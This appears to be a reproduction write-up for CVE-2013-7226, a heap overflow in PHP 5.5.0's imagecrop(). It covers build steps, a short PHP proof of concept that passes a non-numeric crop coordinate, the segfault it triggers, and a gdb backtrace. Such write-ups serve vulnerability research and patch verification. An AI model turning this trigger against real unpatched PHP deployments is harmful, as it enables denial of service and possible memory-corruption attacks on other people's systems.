# CVE-2013-7226: PHP Heap Overflow Vulnerability in imagecrop()

## Dependency
```
$ sudo apt install libpng-dev libxml2-dev
```

## Build
```
wget http://museum.php.net/php5/php-5.5.0.tar.gz
tar xvfz php-5.5.0.tar.gz && cd php-5.5.0
./configure --with-gd
make -j$(nproc)
```

`sapi/cli/php` binary will be created

## PoC

```php
<?
$img = imagecreatetruecolor(10, 10);
$img = imagecrop($img, array("x" => "a", "y" => 0, "width" => 10, "height" => 10));
```

## Trigger
```
$ php-5.5.0/sapi/cli/php poc.php
“php-5.5.0/sapi/cli/php ./poc.php” terminated by signal SIGSEGV (Address boundary error)
```

## Backtrace
```
gdb-peda$ bt
#0  __memmove_avx_unaligned_erms () at ../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S:225
#1  0x000055a222cbf0f0 in memcpy (__len=<optimized out>, __src=<optimized out>, __dest=<optimized out>) at /usr/include/x86_64-linux-gnu/bits/string_fortified.h:34
#2  gdImageCrop (src=src@entry=0x7f3ccaa6efa0, crop=crop@entry=0x7ffc2339b870) at /home/add/work/target/php-5.5.0/ext/gd/libgd/gd_crop.c:73
#3  0x000055a222ca912b in zif_imagecrop (ht=<optimized out>, return_value=0x7f3ccaa6e178, return_value_ptr=<optimized out>, this_ptr=<optimized out>, return_value_used=<optimized out>) at /home/add/work/target/php-5.5.0/ext/gd/gd.c:5002
#4  0x000055a222f127f9 in zend_do_fcall_common_helper_SPEC (execute_data=<optimized out>) at /home/add/work/target/php-5.5.0/Zend/zend_vm_execute.h:543
#5  0x000055a222e8640e in execute_ex (execute_data=0x7f3ccaa38100) at /home/add/work/target/php-5.5.0/Zend/zend_vm_execute.h:356
#6  0x000055a222e5b9cb in zend_execute_scripts (type=type@entry=0x8, retval=retval@entry=0x0, file_count=file_count@entry=0x3) at /home/add/work/target/php-5.5.0/Zend/zend.c:1316
#7  0x000055a222dfb28e in php_execute_script (primary_file=0x7ffc2339de70) at /home/add/work/target/php-5.5.0/main/main.c:2481
#8  0x000055a222f142a7 in do_cli (argc=0x2, argv=0x55a224786490) at /home/add/work/target/php-5.5.0/sapi/cli/php_cli.c:993
#9  0x000055a222ba06f9 in main (argc=argc@entry=0x2, argv=0x55a224786490, argv@entry=0x7ffc2339f3a8) at /home/add/work/target/php-5.5.0/sapi/cli/php_cli.c:1377
#10 0x00007f3cc94d7b97 in __libc_start_main (main=0x55a222ba0270 <main>, argc=0x2, argv=0x7ffc2339f3a8, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7ffc2339f398) at ../csu/libc-start.c:310
```

## References
- https://www.php.net/releases/index.php
- https://hackerone.com/reports/1356
- https://github.com/php/php-src/commit/2938329ce19cb8c4197dec146c3ec887c6f61d01